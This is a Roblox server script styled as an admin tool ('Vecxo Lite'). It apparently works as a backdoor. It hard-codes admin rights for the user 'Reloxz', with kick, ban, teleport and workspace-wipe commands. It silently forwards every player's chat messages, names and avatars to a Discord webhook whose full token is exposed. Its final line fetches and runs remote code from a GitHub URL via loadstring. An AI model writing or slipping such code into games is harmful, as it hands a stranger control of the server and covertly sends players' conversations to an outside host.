--//VECXO LITE STARTS HERE

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local whitelisted = {
	["Reloxz"] = true,
}

local bannedPlayers = {}

local TweenService = game:GetService("TweenService")

local function notify(player, title, message)
	local gui = Instance.new("ScreenGui")
	gui.Name = "AdminNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = player:FindFirstChildOfClass("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0.4, 0, 0.2, 0)
	frame.Position = UDim2.new(0.5, 0, 0.1, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Parent = gui

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
	titleLabel.Position = UDim2.new(0, 0, 0, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	titleLabel.TextStrokeTransparency = 1
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.Font = Enum.Font.Code
	titleLabel.TextScaled = true
	titleLabel.Text = title
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
	messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
	messageLabel.BackgroundTransparency = 1
	messageLabel.TextTransparency = 1
	messageLabel.TextStrokeTransparency = 1
	messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
	messageLabel.Font = Enum.Font.Code
	messageLabel.TextScaled = true
	messageLabel.TextWrapped = true
	messageLabel.Text = message
	messageLabel.Parent = frame

	local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
	TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
	TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

	task.delay(5, function()
		local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
		TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		task.wait(0.5)
		gui:Destroy()
	end)
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	-- Create tweens
	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()

	fadeOutTween.Completed:Wait()

	screenGui:Destroy()
end


local function processCommand(sender, msg)
	if not whitelisted[sender.Name] then return end
	local args = msg:split(" ")
	local cmd = args[1]:lower()

	if cmd == "!wl" and args[2] then
		local targetName = args[2]:lower()
		local targetPlayer = nil
		for _, plr in ipairs(Players:GetPlayers()) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetName) == targetName or displayNameLower:sub(1, #targetName) == targetName then
				targetPlayer = plr
				break
			end
		end
		if targetPlayer then
			whitelisted[targetPlayer.Name] = true
			notify(sender, "[Vecxo Lite]", "Whitelisted " .. targetPlayer.Name)
			notifyv2(targetPlayer, "[Vecxo Lite]:", "You have been whitelisted. Usage: !cmds")
		else
			notifyv2(sender, "[Vecxo Lite]", "Player '" .. args[2] .. "' not found.")
		end

	elseif cmd == "!unwl" and args[2] then
		local targetName = args[2]:lower()
		local targetPlayer = nil
		for _, plr in ipairs(Players:GetPlayers()) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetName) == targetName or displayNameLower:sub(1, #targetName) == targetName then
				targetPlayer = plr
				break
			end
		end
		if targetPlayer then
			whitelisted[targetPlayer.Name] = nil
			notify(sender, "[Vecxo Lite]", "Removed " .. targetPlayer.Name .. " from whitelist")
		else
			notifyv2(sender, "[Vecxo Lite]", "Player '" .. args[2] .. "' not found.")
		end
		
		
	elseif cmd == "!clr" then
		for _, v in pairs(game.Workspace:GetChildren()) do
			if v:IsA("Part") and v.Parent == game.Workspace then
				v:Destroy()
			elseif v:IsA("TrussPart") and v.Parent == game.Workspace then
				v:Destroy()
			elseif v:IsA("WedgePart") and v.Parent == game.Workspace then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetChildren()) do
			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			if v.Name ~= "face" and (v:IsA("Decal") or v:IsA("ParticleEmitter")) then
				v:Destroy()
			end
		end
		notifyv2(sender, "[Vecxo Lite]", "Workspace cleared")
	
	elseif cmd == "!cmds" then
		notify(sender, "[Vecxo Lite]", "!kick <plr> [reason]\n!ban <plr> [reason]\n!h <message>\n!rj <plr>\n!wl <plr>\n!unwl <plr>\n!clr")

	elseif cmd == "!kick" and args[2] then
		local targetName = args[2]:lower()
		local reason = msg:match("^!kick%s+%S+%s+(.+)$") 
		for _, plr in ipairs(Players:GetPlayers()) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetName) == targetName or displayNameLower:sub(1, #targetName) == targetName then
				if reason then
					plr:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
					notifyv2(sender, "[Vecxo Lite]", "Kicked " .. plr.Name)
				else
					plr:Destroy()
					notifyv2(sender, "[Vecxo Lite]", "Kicked " .. plr.Name)
				end
				return
			end
		end

	elseif cmd == "!ban" and args[2] then
		local targetName = args[2]:lower()
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")

		for _, plr in ipairs(Players:GetPlayers()) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetName) == targetName or displayNameLower:sub(1, #targetName) == targetName then
				bannedPlayers[plr.UserId] = true
				if reason then
					plr:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
					notifyv2(sender, "[Vecxo Lite]", "Banned " .. plr.Name)
				else
					plr:Destroy()
					notifyv2(sender, "[Vecxo Lite]", "Banned " .. plr.Name)
				end
				return
			end
		end

	elseif cmd == "!rj" and args[2] then
		local targetName = args[2]:lower()
		local targetPlayer = nil
		for _, plr in pairs(game.Players:GetPlayers()) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetName) == targetName or displayNameLower:sub(1, #targetName) == targetName then
				targetPlayer = plr
				break
			end
		end
		if targetPlayer then
			notifyv2(sender, "[Vecxo Lite]", "Rejoining " .. targetPlayer.DisplayName)
			local TeleportService = game:GetService("TeleportService")
			local placeId = game.PlaceId
			local jobId = game.JobId
			TeleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
		else
			print("Player '" .. args[2] .. "' not found.")
			notify(sender, "[Vecxo Lite]", args[2].." was not found.")
		end

	elseif cmd == "!h" then
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
			notify(plr, "[Vecxo Lite]", announcement)
		end
	end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function getAvatarURL(userId)
	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

local function connectChatLogger(player)
	local avatarUrl = getAvatarURL(player.UserId)

	player.Chatted:Connect(function(message)
		local safeMessage = sanitizeMessage(message)

		local payload = {
			username = player.Name .. " (@" .. player.DisplayName .. ")",
			content = safeMessage,
			avatar_url = avatarUrl
		}

		local success, response = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send message to Discord:", response)
		end
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if whitelisted[player.Name] then
		notify(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end

Players.PlayerAdded:Connect(function(player)
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
		return
	end
	if whitelisted[player.Name] then
		notifyv2(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end)

loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))()
